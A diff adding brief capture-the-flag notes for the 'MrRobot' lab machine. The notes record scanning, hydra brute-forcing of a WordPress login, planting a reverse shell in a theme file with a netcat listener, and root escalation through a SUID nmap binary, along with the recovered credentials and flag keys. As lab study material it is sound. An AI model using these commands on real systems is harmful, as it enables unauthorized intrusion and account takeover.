@@ -1,0 +1,62 @@
+MrRobot 
+10.10.0.241
+
+nmap scan ::
+22 ssh
+80 apache
+443 apache
+
+gobuster ::
+0/
+admin/
+wp-login.php
+
+checked the robots.txt and found 
+dic file
+key 1 :: 073403c8a58a1f80d943455fb30724b9
+
+.dic is a dictionary file normally consists of a collection of words
+normally password files
+sort the fsocity.dic to remove duplicates and hence make the password bruteforce faster
+sort fsocity.dic | uniq > wordlist.txt
+
+using hydra to brute force the wp-login.php with the fsocity.dic file
+hydra -L wordlist.txt -p test 10.10.0.241 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:invalid login" -t 30
+Elliot
+hydra -l Elliot -P wordlist.txt 10.10.0.241 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:invalid password"
+ER28-0653
+
+Elliot:ER28-0653
+
+logged in to the wp-login
+select the editor 
+choose archive.php
+paste the reverse shell code into the archive.php
+save it 
+run http://10.10.0.241/wp-content/themes/twentyfifteen/archive.php
+listen with netcat
+nc -lvnp 1234
+
+stabilize the shell with python tty
+
+search for key 2 
+822c73956184f694993bede3eb39f959
+
+crack the md5 file 
+pass:abcdefghijklmnopqrstuvwxyz
+
+su robot with the credential
+su robot
+
+check the set SUID binaries
+
+nmap has the SUID binary set
+abusing that
+check GTFObins for an exploit
+
+/usr/local/nmap --interactive
+nmap> !sh
+
+cat/root/key-3-of-3.txt
+
+root:04787ddef27c3dee1ee161b21670b4e4
